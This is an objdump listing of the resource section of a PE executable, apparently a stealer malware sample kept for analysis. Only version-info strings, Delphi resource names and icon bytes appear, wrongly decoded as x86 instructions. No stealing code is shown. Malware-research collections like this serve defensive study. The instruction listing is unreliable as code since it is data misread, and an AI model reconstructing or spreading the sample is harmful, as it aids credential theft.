
malware_samples/stealer/1273d537c7dd3abee3fcb02e94d75f12935e1b546847ee715988bfa7de48f4ea.exe:     file format pei-i386


Disassembly of section .rsrc:

0042e000 <.rsrc>:
	...
  42e00c:	01 00                	add    %eax,(%eax)
  42e00e:	04 00                	add    $0x0,%al
  42e010:	a8 01                	test   $0x1,%al
  42e012:	00 80 38 00 00 80    	add    %al,-0x7fffffc8(%eax)
  42e018:	03 00                	add    (%eax),%eax
  42e01a:	00 00                	add    %al,(%eax)
  42e01c:	78 00                	js     0x42e01e
  42e01e:	00 80 0a 00 00 00    	add    %al,0xa(%eax)
  42e024:	b8 00 00 80 0e       	mov    $0xe800000,%eax
  42e029:	00 00                	add    %al,(%eax)
  42e02b:	00 28                	add    %ch,(%eax)
  42e02d:	01 00                	add    %eax,(%eax)
  42e02f:	80 10 00             	adcb   $0x0,(%eax)
  42e032:	00 00                	add    %al,(%eax)
  42e034:	68 01 00 80 00       	push   $0x800001
  42e039:	00 00                	add    %al,(%eax)
  42e03b:	00 a2 7e 5a 35 00    	add    %ah,0x355a7e(%edx)
  42e041:	00 00                	add    %al,(%eax)
  42e043:	00 01                	add    %al,(%ecx)
  42e045:	00 00                	add    %al,(%eax)
  42e047:	00 b0 01 00 80 50    	add    %dh,0x50800001(%eax)
  42e04d:	00 00                	add    %al,(%eax)
  42e04f:	80 00 00             	addb   $0x0,(%eax)
  42e052:	00 00                	add    %al,(%eax)
  42e054:	a2 7e 5a 35 00       	mov    %al,0x355a7e
  42e059:	00 00                	add    %al,(%eax)
  42e05b:	00 00                	add    %al,(%eax)
  42e05d:	00 01                	add    %al,(%ecx)
  42e05f:	00 00                	add    %al,(%eax)
  42e061:	00 00                	add    %al,(%eax)
  42e063:	00 68 00             	add    %ch,0x0(%eax)
  42e066:	00 00                	add    %al,(%eax)
  42e068:	f4                   	hlt
  42e069:	51                   	push   %ecx
  42e06a:	02 00                	add    (%eax),%al
  42e06c:	00 60 00             	add    %ah,0x0(%eax)
	...
  42e07b:	00 a2 7e 5a 35 00    	add    %ah,0x355a7e(%edx)
  42e081:	00 00                	add    %al,(%eax)
  42e083:	00 00                	add    %al,(%eax)
  42e085:	00 01                	add    %al,(%ecx)
  42e087:	00 01                	add    %al,(%ecx)
  42e089:	00 00                	add    %al,(%eax)
  42e08b:	00 90 00 00 80 00    	add    %dl,0x800000(%eax)
  42e091:	00 00                	add    %al,(%eax)
  42e093:	00 a2 7e 5a 35 00    	add    %ah,0x355a7e(%edx)
  42e099:	00 00                	add    %al,(%eax)
  42e09b:	00 00                	add    %al,(%eax)
  42e09d:	00 01                	add    %al,(%ecx)
  42e09f:	00 04 08             	add    %al,(%eax,%ecx,1)
  42e0a2:	00 00                	add    %al,(%eax)
  42e0a4:	a8 00                	test   $0x0,%al
  42e0a6:	00 00                	add    %al,(%eax)
  42e0a8:	7a e4                	jp     0x42e08e
  42e0aa:	02 00                	add    (%eax),%al
  42e0ac:	a8 0c                	test   $0xc,%al
	...
  42e0ba:	00 00                	add    %al,(%eax)
  42e0bc:	a2 7e 5a 35 00       	mov    %al,0x355a7e
  42e0c1:	00 00                	add    %al,(%eax)
  42e0c3:	00 02                	add    %al,(%edx)
  42e0c5:	00 00                	add    %al,(%eax)
  42e0c7:	00 ba 01 00 80 d8    	add    %bh,-0x277fffff(%edx)
  42e0cd:	00 00                	add    %al,(%eax)
  42e0cf:	80 c8 01             	or     $0x1,%al
  42e0d2:	00 80 00 01 00 80    	add    %al,-0x7fffff00(%eax)
  42e0d8:	00 00                	add    %al,(%eax)
  42e0da:	00 00                	add    %al,(%eax)
  42e0dc:	a2 7e 5a 35 00       	mov    %al,0x355a7e
  42e0e1:	00 00                	add    %al,(%eax)
  42e0e3:	00 00                	add    %al,(%eax)
  42e0e5:	00 01                	add    %al,(%ecx)
  42e0e7:	00 00                	add    %al,(%eax)
  42e0e9:	00 00                	add    %al,(%eax)
  42e0eb:	00 f0                	add    %dh,%al
  42e0ed:	00 00                	add    %al,(%eax)
  42e0ef:	00 9c be 02 00 10 00 	add    %bl,0x100002(%esi,%edi,4)
	...
  42e102:	00 00                	add    %al,(%eax)
  42e104:	a2 7e 5a 35 00       	mov    %al,0x355a7e
  42e109:	00 00                	add    %al,(%eax)
  42e10b:	00 00                	add    %al,(%eax)
  42e10d:	00 01                	add    %al,(%ecx)
  42e10f:	00 00                	add    %al,(%eax)
  42e111:	00 00                	add    %al,(%eax)
  42e113:	00 18                	add    %bl,(%eax)
  42e115:	01 00                	add    %eax,(%eax)
  42e117:	00 ac be 02 00 f0 00 	add    %ch,0xf00002(%esi,%edi,4)
	...
  42e12a:	00 00                	add    %al,(%eax)
  42e12c:	a2 7e 5a 35 00       	mov    %al,0x355a7e
  42e131:	00 00                	add    %al,(%eax)
  42e133:	00 01                	add    %al,(%ecx)
  42e135:	00 00                	add    %al,(%eax)
  42e137:	00 e0                	add    %ah,%al
  42e139:	01 00                	add    %eax,(%eax)
  42e13b:	80 40 01 00          	addb   $0x0,0x1(%eax)
  42e13f:	80 00 00             	addb   $0x0,(%eax)
  42e142:	00 00                	add    %al,(%eax)
  42e144:	a2 7e 5a 35 00       	mov    %al,0x355a7e
  42e149:	00 00                	add    %al,(%eax)
  42e14b:	00 00                	add    %al,(%eax)
  42e14d:	00 01                	add    %al,(%ecx)
  42e14f:	00 04 08             	add    %al,(%eax,%ecx,1)
  42e152:	00 00                	add    %al,(%eax)
  42e154:	58                   	pop    %eax
  42e155:	01 00                	add    %eax,(%eax)
  42e157:	00 66 e4             	add    %ah,-0x1c(%esi)
  42e15a:	02 00                	add    (%eax),%al
  42e15c:	14 00                	adc    $0x0,%al
	...
  42e16a:	00 00                	add    %al,(%eax)
  42e16c:	a2 7e 5a 35 00       	mov    %al,0x355a7e
  42e171:	00 00                	add    %al,(%eax)
  42e173:	00 00                	add    %al,(%eax)
  42e175:	00 01                	add    %al,(%ecx)
  42e177:	00 01                	add    %al,(%ecx)
  42e179:	00 00                	add    %al,(%eax)
  42e17b:	00 80 01 00 80 00    	add    %al,0x800001(%eax)
  42e181:	00 00                	add    %al,(%eax)
  42e183:	00 a2 7e 5a 35 00    	add    %ah,0x355a7e(%edx)
  42e189:	00 00                	add    %al,(%eax)
  42e18b:	00 00                	add    %al,(%eax)
  42e18d:	00 01                	add    %al,(%ecx)
  42e18f:	00 04 08             	add    %al,(%eax,%ecx,1)
  42e192:	00 00                	add    %al,(%eax)
  42e194:	98                   	cwtl
  42e195:	01 00                	add    %eax,(%eax)
  42e197:	00 f2                	add    %dh,%dl
  42e199:	e1 02                	loope  0x42e19d
  42e19b:	00 74 02 00          	add    %dh,0x0(%edx,%eax,1)
	...
  42e1a7:	00 03                	add    %al,(%ebx)
  42e1a9:	00 44 00 4c          	add    %al,0x4c(%eax,%eax,1)
  42e1ad:	00 4c 00 04          	add    %cl,0x4(%eax,%eax,1)
  42e1b1:	00 44 00 4c          	add    %al,0x4c(%eax,%eax,1)
  42e1b5:	00 4c 00 31          	add    %cl,0x31(%eax,%eax,1)
  42e1b9:	00 06                	add    %al,(%esi)
  42e1bb:	00 44 00 56          	add    %al,0x56(%eax,%eax,1)
  42e1bf:	00 43 00             	add    %al,0x0(%ebx)
  42e1c2:	4c                   	dec    %esp
  42e1c3:	00 41 00             	add    %al,0x0(%ecx)
  42e1c6:	4c                   	dec    %esp
  42e1c7:	00 0b                	add    %cl,(%ebx)
  42e1c9:	00 50 00             	add    %dl,0x0(%eax)
  42e1cc:	41                   	inc    %ecx
  42e1cd:	00 43 00             	add    %al,0x0(%ebx)
  42e1d0:	4b                   	dec    %ebx
  42e1d1:	00 41 00             	add    %al,0x0(%ecx)
  42e1d4:	47                   	inc    %edi
  42e1d5:	00 45 00             	add    %al,0x0(%ebp)
  42e1d8:	49                   	dec    %ecx
  42e1d9:	00 4e 00             	add    %cl,0x0(%esi)
  42e1dc:	46                   	inc    %esi
  42e1dd:	00 4f 00             	add    %cl,0x0(%edi)
  42e1e0:	08 00                	or     %al,(%eax)
  42e1e2:	4d                   	dec    %ebp
  42e1e3:	00 41 00             	add    %al,0x0(%ecx)
  42e1e6:	49                   	dec    %ecx
  42e1e7:	00 4e 00             	add    %cl,0x0(%esi)
  42e1ea:	49                   	dec    %ecx
  42e1eb:	00 43 00             	add    %al,0x0(%ebx)
  42e1ee:	4f                   	dec    %edi
  42e1ef:	00 4e 00             	add    %cl,0x0(%esi)
  42e1f2:	74 02                	je     0x42e1f6
  42e1f4:	34 00                	xor    $0x0,%al
  42e1f6:	00 00                	add    %al,(%eax)
  42e1f8:	56                   	push   %esi
  42e1f9:	00 53 00             	add    %dl,0x0(%ebx)
  42e1fc:	5f                   	pop    %edi
  42e1fd:	00 56 00             	add    %dl,0x0(%esi)
  42e200:	45                   	inc    %ebp
  42e201:	00 52 00             	add    %dl,0x0(%edx)
  42e204:	53                   	push   %ebx
  42e205:	00 49 00             	add    %cl,0x0(%ecx)
  42e208:	4f                   	dec    %edi
  42e209:	00 4e 00             	add    %cl,0x0(%esi)
  42e20c:	5f                   	pop    %edi
  42e20d:	00 49 00             	add    %cl,0x0(%ecx)
  42e210:	4e                   	dec    %esi
  42e211:	00 46 00             	add    %al,0x0(%esi)
  42e214:	4f                   	dec    %edi
  42e215:	00 00                	add    %al,(%eax)
  42e217:	00 00                	add    %al,(%eax)
  42e219:	00 bd 04 ef fe 00    	add    %bh,0xfeef04(%ebp)
  42e21f:	00 01                	add    %al,(%ecx)
  42e221:	00 00                	add    %al,(%eax)
  42e223:	00 01                	add    %al,(%ecx)
  42e225:	00 00                	add    %al,(%eax)
  42e227:	00 00                	add    %al,(%eax)
  42e229:	00 00                	add    %al,(%eax)
  42e22b:	00 01                	add    %al,(%ecx)
  42e22d:	00 00                	add    %al,(%eax)
  42e22f:	00 00                	add    %al,(%eax)
  42e231:	00 3f                	add    %bh,(%edi)
  42e233:	00 00                	add    %al,(%eax)
  42e235:	00 00                	add    %al,(%eax)
  42e237:	00 00                	add    %al,(%eax)
  42e239:	00 04 00             	add    %al,(%eax,%eax,1)
  42e23c:	00 00                	add    %al,(%eax)
  42e23e:	01 00                	add    %eax,(%eax)
	...
  42e24c:	00 00                	add    %al,(%eax)
  42e24e:	d2 01                	rolb   %cl,(%ecx)
  42e250:	00 00                	add    %al,(%eax)
  42e252:	00 00                	add    %al,(%eax)
  42e254:	53                   	push   %ebx
  42e255:	00 74 00 72          	add    %dh,0x72(%eax,%eax,1)
  42e259:	00 69 00             	add    %ch,0x0(%ecx)
  42e25c:	6e                   	outsb  %ds:(%esi),(%dx)
  42e25d:	00 67 00             	add    %ah,0x0(%edi)
  42e260:	46                   	inc    %esi
  42e261:	00 69 00             	add    %ch,0x0(%ecx)
  42e264:	6c                   	insb   (%dx),%es:(%edi)
  42e265:	00 65 00             	add    %ah,0x0(%ebp)
  42e268:	49                   	dec    %ecx
  42e269:	00 6e 00             	add    %ch,0x0(%esi)
  42e26c:	66 00 6f 00          	data16 add %ch,0x0(%edi)
  42e270:	00 00                	add    %al,(%eax)
  42e272:	ae                   	scas   %es:(%edi),%al
  42e273:	01 00                	add    %eax,(%eax)
  42e275:	00 00                	add    %al,(%eax)
  42e277:	00 30                	add    %dh,(%eax)
  42e279:	00 38                	add    %bh,(%eax)
  42e27b:	00 30                	add    %dh,(%eax)
  42e27d:	00 34 00             	add    %dh,(%eax,%eax,1)
  42e280:	30 00                	xor    %al,(%eax)
  42e282:	33 00                	xor    (%eax),%eax
  42e284:	41                   	inc    %ecx
  42e285:	00 38                	add    %bh,(%eax)
  42e287:	00 00                	add    %al,(%eax)
  42e289:	00 22                	add    %ah,(%edx)
  42e28b:	00 01                	add    %al,(%ecx)
  42e28d:	00 01                	add    %al,(%ecx)
  42e28f:	00 43 00             	add    %al,0x0(%ebx)
  42e292:	6f                   	outsl  %ds:(%esi),(%dx)
  42e293:	00 6d 00             	add    %ch,0x0(%ebp)
  42e296:	70 00                	jo     0x42e298
  42e298:	61                   	popa
  42e299:	00 6e 00             	add    %ch,0x0(%esi)
  42e29c:	79 00                	jns    0x42e29e
  42e29e:	4e                   	dec    %esi
  42e29f:	00 61 00             	add    %ah,0x0(%ecx)
  42e2a2:	6d                   	insl   (%dx),%es:(%edi)
  42e2a3:	00 65 00             	add    %ah,0x0(%ebp)
	...
  42e2ae:	2a 00                	sub    (%eax),%al
  42e2b0:	01 00                	add    %eax,(%eax)
  42e2b2:	01 00                	add    %eax,(%eax)
  42e2b4:	46                   	inc    %esi
  42e2b5:	00 69 00             	add    %ch,0x0(%ecx)
  42e2b8:	6c                   	insb   (%dx),%es:(%edi)
  42e2b9:	00 65 00             	add    %ah,0x0(%ebp)
  42e2bc:	44                   	inc    %esp
  42e2bd:	00 65 00             	add    %ah,0x0(%ebp)
  42e2c0:	73 00                	jae    0x42e2c2
  42e2c2:	63 00                	arpl   %eax,(%eax)
  42e2c4:	72 00                	jb     0x42e2c6
  42e2c6:	69 00 70 00 74 00    	imul   $0x740070,(%eax),%eax
  42e2cc:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
	...
  42e2da:	30 00                	xor    %al,(%eax)
  42e2dc:	08 00                	or     %al,(%eax)
  42e2de:	01 00                	add    %eax,(%eax)
  42e2e0:	46                   	inc    %esi
  42e2e1:	00 69 00             	add    %ch,0x0(%ecx)
  42e2e4:	6c                   	insb   (%dx),%es:(%edi)
  42e2e5:	00 65 00             	add    %ah,0x0(%ebp)
  42e2e8:	56                   	push   %esi
  42e2e9:	00 65 00             	add    %ah,0x0(%ebp)
  42e2ec:	72 00                	jb     0x42e2ee
  42e2ee:	73 00                	jae    0x42e2f0
  42e2f0:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  42e2f6:	00 00                	add    %al,(%eax)
  42e2f8:	00 00                	add    %al,(%eax)
  42e2fa:	31 00                	xor    %eax,(%eax)
  42e2fc:	2e 00 30             	add    %dh,%cs:(%eax)
  42e2ff:	00 2e                	add    %ch,(%esi)
  42e301:	00 30                	add    %dh,(%eax)
  42e303:	00 2e                	add    %ch,(%esi)
  42e305:	00 30                	add    %dh,(%eax)
  42e307:	00 00                	add    %al,(%eax)
  42e309:	00 22                	add    %ah,(%edx)
  42e30b:	00 01                	add    %al,(%ecx)
  42e30d:	00 01                	add    %al,(%ecx)
  42e30f:	00 49 00             	add    %cl,0x0(%ecx)
  42e312:	6e                   	outsb  %ds:(%esi),(%dx)
  42e313:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  42e317:	00 72 00             	add    %dh,0x0(%edx)
  42e31a:	6e                   	outsb  %ds:(%esi),(%dx)
  42e31b:	00 61 00             	add    %ah,0x0(%ecx)
  42e31e:	6c                   	insb   (%dx),%es:(%edi)
  42e31f:	00 4e 00             	add    %cl,0x0(%esi)
  42e322:	61                   	popa
  42e323:	00 6d 00             	add    %ch,0x0(%ebp)
  42e326:	65 00 00             	add    %al,%gs:(%eax)
  42e329:	00 00                	add    %al,(%eax)
  42e32b:	00 00                	add    %al,(%eax)
  42e32d:	00 26                	add    %ah,(%esi)
  42e32f:	00 01                	add    %al,(%ecx)
  42e331:	00 01                	add    %al,(%ecx)
  42e333:	00 4c 00 65          	add    %cl,0x65(%eax,%eax,1)
  42e337:	00 67 00             	add    %ah,0x0(%edi)
  42e33a:	61                   	popa
  42e33b:	00 6c 00 43          	add    %ch,0x43(%eax,%eax,1)
  42e33f:	00 6f 00             	add    %ch,0x0(%edi)
  42e342:	70 00                	jo     0x42e344
  42e344:	79 00                	jns    0x42e346
  42e346:	72 00                	jb     0x42e348
  42e348:	69 00 67 00 68 00    	imul   $0x680067,(%eax),%eax
  42e34e:	74 00                	je     0x42e350
  42e350:	00 00                	add    %al,(%eax)
  42e352:	00 00                	add    %al,(%eax)
  42e354:	00 00                	add    %al,(%eax)
  42e356:	2a 00                	sub    (%eax),%al
  42e358:	01 00                	add    %eax,(%eax)
  42e35a:	01 00                	add    %eax,(%eax)
  42e35c:	4c                   	dec    %esp
  42e35d:	00 65 00             	add    %ah,0x0(%ebp)
  42e360:	67 00 61 00          	add    %ah,0x0(%bx,%di)
  42e364:	6c                   	insb   (%dx),%es:(%edi)
  42e365:	00 54 00 72          	add    %dl,0x72(%eax,%eax,1)
  42e369:	00 61 00             	add    %ah,0x0(%ecx)
  42e36c:	64 00 65 00          	add    %ah,%fs:0x0(%ebp)
  42e370:	6d                   	insl   (%dx),%es:(%edi)
  42e371:	00 61 00             	add    %ah,0x0(%ecx)
  42e374:	72 00                	jb     0x42e376
  42e376:	6b 00 73             	imul   $0x73,(%eax),%eax
	...
  42e381:	00 2a                	add    %ch,(%edx)
  42e383:	00 01                	add    %al,(%ecx)
  42e385:	00 01                	add    %al,(%ecx)
  42e387:	00 4f 00             	add    %cl,0x0(%edi)
  42e38a:	72 00                	jb     0x42e38c
  42e38c:	69 00 67 00 69 00    	imul   $0x690067,(%eax),%eax
  42e392:	6e                   	outsb  %ds:(%esi),(%dx)
  42e393:	00 61 00             	add    %ah,0x0(%ecx)
  42e396:	6c                   	insb   (%dx),%es:(%edi)
  42e397:	00 46 00             	add    %al,0x0(%esi)
  42e39a:	69 00 6c 00 65 00    	imul   $0x65006c,(%eax),%eax
  42e3a0:	6e                   	outsb  %ds:(%esi),(%dx)
  42e3a1:	00 61 00             	add    %ah,0x0(%ecx)
  42e3a4:	6d                   	insl   (%dx),%es:(%edi)
  42e3a5:	00 65 00             	add    %ah,0x0(%ebp)
  42e3a8:	00 00                	add    %al,(%eax)
  42e3aa:	00 00                	add    %al,(%eax)
  42e3ac:	00 00                	add    %al,(%eax)
  42e3ae:	22 00                	and    (%eax),%al
  42e3b0:	01 00                	add    %eax,(%eax)
  42e3b2:	01 00                	add    %eax,(%eax)
  42e3b4:	50                   	push   %eax
  42e3b5:	00 72 00             	add    %dh,0x0(%edx)
  42e3b8:	6f                   	outsl  %ds:(%esi),(%dx)
  42e3b9:	00 64 00 75          	add    %ah,0x75(%eax,%eax,1)
  42e3bd:	00 63 00             	add    %ah,0x0(%ebx)
  42e3c0:	74 00                	je     0x42e3c2
  42e3c2:	4e                   	dec    %esi
  42e3c3:	00 61 00             	add    %ah,0x0(%ecx)
  42e3c6:	6d                   	insl   (%dx),%es:(%edi)
  42e3c7:	00 65 00             	add    %ah,0x0(%ebp)
	...
  42e3d2:	34 00                	xor    $0x0,%al
  42e3d4:	08 00                	or     %al,(%eax)
  42e3d6:	01 00                	add    %eax,(%eax)
  42e3d8:	50                   	push   %eax
  42e3d9:	00 72 00             	add    %dh,0x0(%edx)
  42e3dc:	6f                   	outsl  %ds:(%esi),(%dx)
  42e3dd:	00 64 00 75          	add    %ah,0x75(%eax,%eax,1)
  42e3e1:	00 63 00             	add    %ah,0x0(%ebx)
  42e3e4:	74 00                	je     0x42e3e6
  42e3e6:	56                   	push   %esi
  42e3e7:	00 65 00             	add    %ah,0x0(%ebp)
  42e3ea:	72 00                	jb     0x42e3ec
  42e3ec:	73 00                	jae    0x42e3ee
  42e3ee:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  42e3f4:	00 00                	add    %al,(%eax)
  42e3f6:	31 00                	xor    %eax,(%eax)
  42e3f8:	2e 00 30             	add    %dh,%cs:(%eax)
  42e3fb:	00 2e                	add    %ch,(%esi)
  42e3fd:	00 30                	add    %dh,(%eax)
  42e3ff:	00 2e                	add    %ch,(%esi)
  42e401:	00 30                	add    %dh,(%eax)
  42e403:	00 00                	add    %al,(%eax)
  42e405:	00 1a                	add    %bl,(%edx)
  42e407:	00 01                	add    %al,(%ecx)
  42e409:	00 01                	add    %al,(%ecx)
  42e40b:	00 43 00             	add    %al,0x0(%ebx)
  42e40e:	6f                   	outsl  %ds:(%esi),(%dx)
  42e40f:	00 6d 00             	add    %ch,0x0(%ebp)
  42e412:	6d                   	insl   (%dx),%es:(%edi)
  42e413:	00 65 00             	add    %ah,0x0(%ebp)
  42e416:	6e                   	outsb  %ds:(%esi),(%dx)
  42e417:	00 74 00 73          	add    %dh,0x73(%eax,%eax,1)
  42e41b:	00 00                	add    %al,(%eax)
  42e41d:	00 00                	add    %al,(%eax)
  42e41f:	00 00                	add    %al,(%eax)
  42e421:	00 44 00 00          	add    %al,0x0(%eax,%eax,1)
  42e425:	00 00                	add    %al,(%eax)
  42e427:	00 56 00             	add    %dl,0x0(%esi)
  42e42a:	61                   	popa
  42e42b:	00 72 00             	add    %dh,0x0(%edx)
  42e42e:	46                   	inc    %esi
  42e42f:	00 69 00             	add    %ch,0x0(%ecx)
  42e432:	6c                   	insb   (%dx),%es:(%edi)
  42e433:	00 65 00             	add    %ah,0x0(%ebp)
  42e436:	49                   	dec    %ecx
  42e437:	00 6e 00             	add    %ch,0x0(%esi)
  42e43a:	66 00 6f 00          	data16 add %ch,0x0(%edi)
  42e43e:	00 00                	add    %al,(%eax)
  42e440:	00 00                	add    %al,(%eax)
  42e442:	24 00                	and    $0x0,%al
  42e444:	04 00                	add    $0x0,%al
  42e446:	00 00                	add    %al,(%eax)
  42e448:	54                   	push   %esp
  42e449:	00 72 00             	add    %dh,0x0(%edx)
  42e44c:	61                   	popa
  42e44d:	00 6e 00             	add    %ch,0x0(%esi)
  42e450:	73 00                	jae    0x42e452
  42e452:	6c                   	insb   (%dx),%es:(%edi)
  42e453:	00 61 00             	add    %ah,0x0(%ecx)
  42e456:	74 00                	je     0x42e458
  42e458:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  42e45e:	00 00                	add    %al,(%eax)
  42e460:	00 00                	add    %al,(%eax)
  42e462:	04 08                	add    $0x8,%al
  42e464:	a8 03                	test   $0x3,%al
  42e466:	00 00                	add    %al,(%eax)
  42e468:	01 00                	add    %eax,(%eax)
  42e46a:	01 00                	add    %eax,(%eax)
  42e46c:	20 20                	and    %ah,(%eax)
  42e46e:	00 00                	add    %al,(%eax)
  42e470:	01 00                	add    %eax,(%eax)
  42e472:	18 00                	sbb    %al,(%eax)
  42e474:	a8 0c                	test   $0xc,%al
  42e476:	00 00                	add    %al,(%eax)
  42e478:	01 00                	add    %eax,(%eax)
  42e47a:	28 00                	sub    %al,(%eax)
  42e47c:	00 00                	add    %al,(%eax)
  42e47e:	00 01                	add    %al,(%ecx)
  42e480:	00 00                	add    %al,(%eax)
  42e482:	00 02                	add    %al,(%edx)
  42e484:	00 00                	add    %al,(%eax)
  42e486:	01 00                	add    %eax,(%eax)
  42e488:	04 00                	add    $0x0,%al
  42e48a:	00 00                	add    %al,(%eax)
  42e48c:	00 00                	add    %al,(%eax)
  42e48e:	00 80 00 00 00 00    	add    %al,0x0(%eax)
	...
  42e4a8:	80 00 00             	addb   $0x0,(%eax)
  42e4ab:	80 00 00             	addb   $0x0,(%eax)
  42e4ae:	00 80 80 00 80 00    	add    %al,0x800080(%eax)
  42e4b4:	00 00                	add    %al,(%eax)
  42e4b6:	80 00 80             	addb   $0x80,(%eax)
  42e4b9:	00 80 80 00 00 80    	add    %al,-0x7fffff80(%eax)
  42e4bf:	80 80 00 c0 c0 c0 00 	addb   $0x0,-0x3f3f4000(%eax)
  42e4c6:	00 00                	add    %al,(%eax)
  42e4c8:	ff 00                	incl   (%eax)
  42e4ca:	00 ff                	add    %bh,%bh
  42e4cc:	00 00                	add    %al,(%eax)
  42e4ce:	00 ff                	add    %bh,%bh
  42e4d0:	ff 00                	incl   (%eax)
  42e4d2:	ff 00                	incl   (%eax)
  42e4d4:	00 00                	add    %al,(%eax)
  42e4d6:	ff 00                	incl   (%eax)
  42e4d8:	ff 00                	incl   (%eax)
  42e4da:	ff                   	(bad)
  42e4db:	ff 00                	incl   (%eax)
  42e4dd:	00 ff                	add    %bh,%bh
  42e4df:	ff                   	(bad)
  42e4e0:	ff 00                	incl   (%eax)
	...
  42e9c6:	00 00                	add    %al,(%eax)
  42e9c8:	00 07                	add    %al,(%edi)
  42e9ca:	77 77                	ja     0x42ea43
  42e9cc:	77 77                	ja     0x42ea45
  42e9ce:	77 77                	ja     0x42ea47
  42e9d0:	77 77                	ja     0x42ea49
  42e9d2:	77 77                	ja     0x42ea4b
  42e9d4:	77 77                	ja     0x42ea4d
  42e9d6:	77 77                	ja     0x42ea4f
  42e9d8:	77 77                	ja     0x42ea51
	...
  42ea3a:	00 00                	add    %al,(%eax)
  42ea3c:	77 77                	ja     0x42eab5
  42ea3e:	77 77                	ja     0x42eab7
  42ea40:	77 77                	ja     0x42eab9
  42ea42:	77 77                	ja     0x42eabb
  42ea44:	77 77                	ja     0x42eabd
  42ea46:	77 77                	ja     0x42eabf
  42ea48:	77 77                	ja     0x42eac1
  42ea4a:	77 77                	ja     0x42eac3
  42ea4c:	77 77                	ja     0x42eac5
  42ea4e:	77 47                	ja     0x42ea97
  42ea50:	74 74                	je     0x42eac6
  42ea52:	74 74                	je     0x42eac8
  42ea54:	74 74                	je     0x42eaca
  42ea56:	76 77                	jbe    0x42eacf
  42ea58:	77 77                	ja     0x42ead1
  42ea5a:	70 00                	jo     0x42ea5c
	...
  42eaac:	00 00                	add    %al,(%eax)
  42eaae:	77 77                	ja     0x42eb27
  42eab0:	77 77                	ja     0x42eb29
  42eab2:	77 77                	ja     0x42eb2b
  42eab4:	77 77                	ja     0x42eb2d
  42eab6:	77 77                	ja     0x42eb2f
  42eab8:	77 77                	ja     0x42eb31
  42eaba:	77 77                	ja     0x42eb33
  42eabc:	77 77                	ja     0x42eb35
  42eabe:	77 77                	ja     0x42eb37
  42eac0:	77 65                	ja     0x42eb27
  42eac2:	76 56                	jbe    0x42eb1a
  42eac4:	56                   	push   %esi
  42eac5:	56                   	push   %esi
  42eac6:	56                   	push   %esi
  42eac7:	56                   	push   %esi
  42eac8:	56                   	push   %esi
  42eac9:	77 67                	ja     0x42eb32
  42eacb:	77 77                	ja     0x42eb44
  42eacd:	87 88 88 88 88 88    	xchg   %ecx,-0x77777778(%eax)
  42ead3:	88 88 88 88 88 88    	mov    %cl,-0x77777778(%eax)
  42ead9:	88 70 00             	mov    %dh,0x0(%eax)
	...
  42eb1c:	00 00                	add    %al,(%eax)
  42eb1e:	77 77                	ja     0x42eb97
  42eb20:	77 77                	ja     0x42eb99
  42eb22:	77 77                	ja     0x42eb9b
  42eb24:	77 77                	ja     0x42eb9d
  42eb26:	77 77                	ja     0x42eb9f
  42eb28:	77 77                	ja     0x42eba1
  42eb2a:	77 77                	ja     0x42eba3
  42eb2c:	77 77                	ja     0x42eba5
  42eb2e:	77 77                	ja     0x42eba7
  42eb30:	77 77                	ja     0x42eba9
  42eb32:	77 74                	ja     0x42eba8
  42eb34:	76 57                	jbe    0x42eb8d
  42eb36:	47                   	inc    %edi
  42eb37:	46                   	inc    %esi
  42eb38:	56                   	push   %esi
  42eb39:	47                   	inc    %edi
  42eb3a:	46                   	inc    %esi
  42eb3b:	56                   	push   %esi
  42eb3c:	56                   	push   %esi
  42eb3d:	74 77                	je     0x42ebb6
  42eb3f:	77 78                	ja     0x42ebb9
  42eb41:	87 88 88 88 88 88    	xchg   %ecx,-0x77777778(%eax)
  42eb47:	88 88 88 88 88 88    	mov    %cl,-0x77777778(%eax)
  42eb4d:	88 88 88 88 88 88    	mov    %cl,-0x77777778(%eax)
  42eb53:	88 88 88 88 88 88    	mov    %cl,-0x77777778(%eax)
  42eb59:	88 70 00             	mov    %dh,0x0(%eax)
	...
  42eb84:	00 07                	add    %al,(%edi)
  42eb86:	77 77                	ja     0x42ebff
  42eb88:	77 77                	ja     0x42ec01
  42eb8a:	77 77                	ja     0x42ec03
  42eb8c:	77 77                	ja     0x42ec05
  42eb8e:	77 77                	ja     0x42ec07
  42eb90:	77 77                	ja     0x42ec09
  42eb92:	77 77                	ja     0x42ec0b
  42eb94:	77 77                	ja     0x42ec0d
  42eb96:	77 77                	ja     0x42ec0f
  42eb98:	77 77                	ja     0x42ec11
  42eb9a:	77 77                	ja     0x42ec13
  42eb9c:	77 77                	ja     0x42ec15
  42eb9e:	77 77                	ja     0x42ec17
  42eba0:	77 77                	ja     0x42ec19
  42eba2:	77 77                	ja     0x42ec1b
  42eba4:	77 74                	ja     0x42ec1a
  42eba6:	77 47                	ja     0x42ebef
  42eba8:	47                   	inc    %edi
  42eba9:	46                   	inc    %esi
  42ebaa:	56                   	push   %esi
  42ebab:	44                   	inc    %esp
  42ebac:	64 46                	fs inc %esi
  42ebae:	44                   	inc    %esp
  42ebaf:	64 64 65 64 76 57    	fs fs gs fs jbe 0x42ec0c
  42ebb5:	67 67 77 67          	addr16 addr16 ja 0x42ec20
  42ebb9:	74 77                	je     0x42ec32
  42ebbb:	67 7c 77             	addr16 jl 0x42ec35
  42ebbe:	c8 c8 c8 88          	enter  $0xc8c8,$0x88
  42ebc2:	88 88 88 88 88 88    	mov    %cl,-0x77777778(%eax)
  42ebc8:	88 88 88 88 88 88    	mov    %cl,-0x77777778(%eax)
  42ebce:	88 88 88 8f 88 f8    	mov    %cl,-0x7777078(%eax)
  42ebd4:	8f 88 f8 88          	(bad)
  42ebd8:	88 f8                	mov    %bh,%al
  42ebda:	70 00                	jo     0x42ebdc
	...
  42ebe4:	00 00                	add    %al,(%eax)
  42ebe6:	00 07                	add    %al,(%edi)
  42ebe8:	77 77                	ja     0x42ec61
  42ebea:	77 77                	ja     0x42ec63
  42ebec:	77 77                	ja     0x42ec65
  42ebee:	77 77                	ja     0x42ec67
  42ebf0:	77 77                	ja     0x42ec69
  42ebf2:	77 77                	ja     0x42ec6b
  42ebf4:	77 77                	ja     0x42ec6d
  42ebf6:	77 77                	ja     0x42ec6f
  42ebf8:	77 77                	ja     0x42ec71
  42ebfa:	77 77                	ja     0x42ec73
  42ebfc:	77 77                	ja     0x42ec75
  42ebfe:	77 77                	ja     0x42ec77
